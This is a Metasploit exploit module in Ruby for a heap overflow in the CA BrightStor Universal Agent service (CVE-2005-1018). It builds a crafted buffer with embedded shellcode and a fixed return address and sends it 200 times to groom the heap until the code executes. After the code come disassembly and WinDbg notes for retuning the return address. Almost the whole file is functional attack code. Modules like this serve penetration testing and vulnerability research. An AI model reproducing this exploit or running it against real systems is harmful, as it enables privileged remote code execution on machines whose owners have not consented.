##
# $Id: universal_agent.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor Universal Agent Overflow',
			'Description'    => %q{
					This module exploits a convoluted heap overflow in the CA
				BrightStor Universal Agent service. Triple userland
				exception results in heap growth and execution of
				dereferenced function pointer at a specified address.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2005-1018'],
					[ 'OSVDB', '15471' ],
					[ 'BID', '13102'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=232&type=vulnerabilities'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					# 250 bytes of space (bytes 0xa5 -> 0xa8 = reversed)
					'Space'    => 164,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'Magic Heap Target #1',
						{
							'Platform' => 'win',
							'Ret'      => 0x01625c44, # We grow to our own return address
						},
					],
				],
			'DisclosureDate' => 'Apr 11 2005',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(6050)
			], self.class)
	end

	def exploit

		print_status("Trying target #{target.name}...")

		# The server reverses four bytes starting at offset 0xa5 :0

		# Create the overflow string
		boom = 'X' * 1024

		# Required field to trigger the fault
		boom[248, 2] = [1000].pack('V')

		# The shellcode, limited to 250 bytes (no nulls)
		boom[256, payload.encoded.length] = payload.encoded

		# This should point to itself
		boom[576, 4] = [target.ret].pack('V')

		# This points to the code below
		boom[580, 4] = [target.ret + 8].pack('V')

		# We have 95 bytes, use it to hop back to shellcode
		boom[584, 6] = "\x68" + [target.ret - 320].pack('V') + "\xc3"

		# Stick the protocol header in front of our request
		req = "\x00\x00\x00\x00\x03\x20\xa8\x02" + boom

		# We keep making new connections and triggering the fault until
		# the heap is grown to encompass our known return address. Once
		# this address has been allocated and filled, each subsequent
		# request will result in our shellcode being executed.

		1.upto(200) {|i|
			connect
			print_status("Sending request #{i} of 200...") if (i % 10) == 0
			sock.put(req)
			disconnect

			# Give the process time to recover from each exception
			select(nil,nil,nil,0.1);
		}

		handler
	end

end


__END__
012a0d91 8b8e445c0000     mov     ecx,[esi+0x5c44]
012a0d97 83c404           add     esp,0x4
012a0d9a 85c9             test    ecx,ecx
012a0d9c 7407             jz      ntagent+0x20da5 (012a0da5)
012a0d9e 8b11             mov     edx,[ecx]         ds:0023:41327441=???????
012a0da0 6a01             push    0x1
012a0da2 ff5204           call    dword ptr [edx+0x4]

Each request will result in another chunk being allocated, the exception
causes these chunks to never be freed. The large chunk size allows us to
predict the location of our buffer and grow our buffer to where we need it.

If these addresses do not match up, run this exploit, then attach with WinDbg:

> s 0 Lfffffff 0x44 0x5c 0x61 0x01

Figure out the pattern, replace the return address, restart the service,
and run it through again. Only tested on WinXP SP1

011b5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
011c5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
011d5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
011e5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
011f5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01205c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
[ snip ]
01605c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01615c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01625c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01635c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01645c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01655c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01665c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01675c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01685c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01695c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
016a5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
016b5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
016c5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
016d5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01725c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
017e5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
